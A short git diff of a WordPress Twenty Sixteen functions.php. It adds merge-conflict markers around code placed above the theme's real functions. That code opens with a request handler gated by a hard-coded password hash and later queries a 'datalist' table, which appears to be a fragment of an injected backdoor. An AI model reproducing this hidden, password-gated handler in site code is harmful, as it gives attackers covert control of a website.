@@ -1,4 +1,5 @@
 <?php
+<<<<<<< HEAD
 
 if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'f209d2fcfc20b22b7726967e19cb2cda'))
 	{
@@ -98,6 +99,8 @@ if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE 
 
 
 ?><?php
+=======
+>>>>>>> atualiza plugins e temas
 /**
  * Twenty Sixteen functions and definitions
  *
